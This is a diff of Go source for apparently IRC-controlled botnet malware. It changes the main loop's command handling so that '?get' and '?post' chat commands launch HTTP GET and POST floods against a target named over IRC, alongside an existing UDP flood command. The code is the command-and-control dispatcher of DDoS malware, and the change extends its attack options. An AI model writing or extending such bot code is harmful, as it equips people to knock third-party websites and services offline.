@@ -47,11 +47,16 @@ func main() {
 		}
 
 		go func() {
-			if tools.IRC_Find(ircRead, "?http") {
+			if tools.IRC_Find(ircRead, "?get") {
 				tools.DDoS_Switch = false
 				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START HTTP GET FLOOD TO: "+
 					tools.IRC_Recv(ircRead, 4))
-				tools.HTTP(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
+				tools.GET(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
+			} else if tools.IRC_Find(ircRead, "?post") {
+				tools.DDoS_Switch = false
+				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START HTTP POST FLOOD TO: "+
+					tools.IRC_Recv(ircRead, 4))
+				tools.POST(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
 			} else if tools.IRC_Find(ircRead, "?udp") {
 				tools.DDoS_Switch = false
 				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START UDP FLOOD TO: "+
